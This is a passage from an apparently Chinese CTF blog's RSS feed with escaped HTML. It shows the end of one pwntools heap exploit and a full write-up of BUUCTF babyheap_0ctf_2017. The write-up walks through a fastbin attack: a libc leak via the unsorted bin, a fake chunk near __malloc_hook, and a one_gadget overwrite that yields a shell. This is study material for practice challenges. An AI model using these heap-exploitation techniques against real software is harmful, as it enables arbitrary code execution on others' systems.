punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;aaaa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bbbb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cccc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;delete&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;magic &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x6020A0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;magic的地址  附件估计错了&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;magic&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;edit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;dddd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;4869&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# gdb.attach(r)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# pause()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/17/Fastbin%20Attack/</guid>
            <title>BUUCTF babyheap_0ctf_2017</title>
            <link>http://example.com/2023/04/17/Fastbin%20Attack/</link>
            <pubDate>Mon, 17 Apr 2023 08:34:11 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;buuctf-babyheap_0ctf_2017&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuctf-babyheap_0ctf_2017&#34;&gt;#&lt;/a&gt; BUUCTF babyheap_0ctf_2017&lt;/h2&gt;
&lt;p&gt;首先申请了 4 个堆  然后 free (1) 和 free (2) 接着修改 #2 的 fd 指向 #4 所在的位置  制造出 #4 被 free 的假象&lt;/p&gt;
&lt;p&gt;然后修改 #4 的 size 位来避开 malloc 的检查。因为我们之后想在 chunk4 的地方重新 malloc&lt;/p&gt;
&lt;p&gt;但是 malloc 的时候会检查 size 是否和要分配的大小相同，这就是为什么上面代码中我们要把 chunk4 的 size 位修改为 0x21&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415220317229.png&#34; alt=&#34;image-20230415220317229&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后重新申请了&lt;/p&gt;
&lt;p&gt;allocate(0x10)&lt;br&gt;
allocate(0x10)&lt;/p&gt;
&lt;p&gt;这里可以看一下结构体内存位置 发现下标为 1 和下标为 2 的内存全为 0 也就是都被 free 掉了&lt;/p&gt;
&lt;p&gt;所以第一个 allocate (0x10) 的内存地址指向下标为 1 的&lt;/p&gt;
&lt;p&gt;第二个 alloca (0x10) 虽然是在 #4 堆块申请了地址 但是会去到下标为 2 的结构体中  但是内存地址指向了 #4 所在的内存地址&lt;/p&gt;
&lt;p&gt;可以用这个看结构体所在位置  一般第一个就是的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221026909.png&#34; alt=&#34;image-20230415221026909&#34;&gt;&lt;/p&gt;
&lt;p&gt;x/1000gx 0x321776f75000  尽量多向后找点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221139838.png&#34; alt=&#34;image-20230415221139838&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221337737.png&#34; alt=&#34;image-20230415221337737&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 allocate 后下标为 2 的结构体内存地址指向堆块 #4 和下标为 4 指向的堆块一样&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;1、fill (3,payload) 其实是将 chunk4 的 size 位变为之前的 0x91&lt;br&gt;
2、allocate (0x80) 用来分割 top chunk 和 chunk4，防止堆块合并，因为我们后面要 free (4)&lt;br&gt;
 3、free (4) 之后，chunk4 会被放到 unsorted bin 中。此时 chunk4 的 fd 指针是 unsorted bin 链表的头部，这个地址为 main_arena + 0x58&lt;/p&gt;
&lt;p&gt;可以看到 0x91 那里已经 free 了所以不能 dump 输出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211452367.png&#34; alt=&#34;image-20230416211452367&#34;&gt;&lt;/p&gt;
&lt;p&gt;同时查看内存发现 index 为 4 那里为空证明已经被 free 了 而 index 为 2 那里的内存指向 index4 所以可以 dump 出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211534372.png&#34; alt=&#34;image-20230416211534372&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后查看结构体中的内存地址 不是堆中的 可以发现下标为 2 的内存地址指向下标为 4 的所以 dump 输出时输出下标为 2 的&lt;/p&gt;
&lt;p&gt;可以输出 chunk4 中的内容&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\x7f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__malloc_hook&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为 dump (2) 那里会输出 main_arena + 0x58 的地址所以需要减去 0x58 再减去 0x10 会找到 malloc_hook 的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416212411772.png&#34; alt=&#34;image-20230416212411772&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 libcbase 的偏移就可以算出来了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时 chunk4 是 unsorted bin。大小为 0x80，此时我们需要分配 0x60。会从 chunk4 里分割出来。我们把他定义为 chunk6，虽然是 chunk6，但是他在结构体数组中的索引为 4。因为 index 为 4 那里为空  所以他的内存地址为 chunk4&lt;/p&gt;
&lt;p&gt;free (4)  4 是下标为 4 所以 free 的是才申请的 chunk6&lt;/p&gt;
&lt;p&gt;这两步主要用来将 chunk4 分离出一个 fasbin 大小的 chunk6，然后再 free。chunk6 进入 fastbin。之后我们可以通过修改 chunk2 修改 chunk6 的值，然后再 malloc，进行 fastbin attack，可以任意地址分配。修改任意内存。&lt;/p&gt;
&lt;p&gt;我们现在需要修改 &lt;code&gt;__malloc_hook&lt;/code&gt;  的值。我们先找到 &lt;code&gt;__malloc_hook&lt;/code&gt;  的地址&lt;/p&gt;
&lt;p&gt;然后查看该 &lt;code&gt;__malloc_hook&lt;/code&gt;  附近的内存空间。&lt;/p&gt;
&lt;p&gt;我们想要在这范围内进行 malloc，就需要绕过 malloc 的限制。我们发现附近 &lt;code&gt;7f&lt;/code&gt;  比较多，我们可以找一个内存地址，将 &lt;code&gt;7f&lt;/code&gt;  当为我们要 malloc 的 size 位。&lt;/p&gt;
&lt;p&gt;例如如下的内存地址， &lt;code&gt;0x7fd25e3b7aed&lt;/code&gt; 。如果我们在这个地址进行 malloc，则 size 位为 0x7f。那我们分配一个 0x60 大小的 chunk，即可绕过 malloc 的限制。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416213543205.png&#34; alt=&#34;image-20230416213543205&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后一个字节是 7f 所以从 0x7f215166daed&lt;/p&gt;
&lt;p&gt;算出偏移为 0x3c4aed&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4aed&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;第一个 allocate (0x60) 分配到 chunk6&lt;/p&gt;
&lt;p&gt;也就是下标为 4 的那里&lt;/p&gt;
&lt;p&gt;第二个 allocate (0x60) 分配的是下标为 6 的 chunk 这里可以动调看一下结构体内存就懂了&lt;/p&gt;
&lt;p&gt;修改完还没分配  可以看到 fd 那里是 libc_base+0x3c4aed&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416215139905.png&#34; alt=&#34;image-20230416215139905&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二个 allocate (0x60) 直接看堆是看不到的  需要看结构体指针那里 前面说过怎么看  会发现他的内存地址为 libc_base+0x3c4aed+0x10&lt;/p&gt;
&lt;p&gt;为什么加了 0x10  可能是前面的下标和判断是否存在占了 0x10  具体还不是很懂&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4526a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416214511799.png&#34; alt=&#34;image-20230416214511799&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里的 fill (6) 是修改的下标为 6 的结构体指针&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220041895.png&#34; alt=&#34;image-20230416220041895&#34;&gt;&lt;/p&gt;
